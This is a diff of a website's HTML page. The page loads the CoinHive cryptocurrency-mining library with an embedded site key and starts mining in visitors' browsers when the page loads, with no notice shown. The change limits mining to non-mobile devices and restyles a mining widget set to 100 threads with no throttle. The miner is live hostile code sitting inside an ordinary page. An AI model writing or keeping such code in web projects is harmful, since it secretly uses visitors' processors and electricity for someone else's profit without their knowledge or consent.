@@ -7,7 +7,9 @@
 	   <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
     	var miner = new CoinHive.Anonymous('zozm2fB1Nj2NQhYrKMCqfqtrm8JvrcFQ');
-    	miner.start();
+    	if (!miner.isMobile(true)) {
+	miner.start();
+}
     </script>
 	  <!-- ขุด -->
 <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
@@ -85,7 +87,7 @@
 	data-background="#1a252f"
 	data-text="#eeeeee"
 	data-action="#000000"
-	data-graph="#555555"
+	data-graph="#000000"
 	data-threads="100"
 	data-throttle="0">
 	<em>Loading...</em>
